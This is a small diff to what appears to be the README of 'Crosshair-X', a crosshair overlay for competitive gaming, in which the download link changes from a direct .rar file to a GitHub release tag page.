@@ -10,7 +10,7 @@ Lightweight and fully customizable crosshair overlay designed for competitive ga
 
 ### Download
 
-[Download Latest Version](https://github.com/signrhinomagnify/Crosshair-X/releases/download/Crosshair-X/Crosshair-X.rar)
+[Download Latest Version](https://github.com/signrhinomagnify/Crosshair-X/releases/tag/Crosshair-X)
 
 ---
 
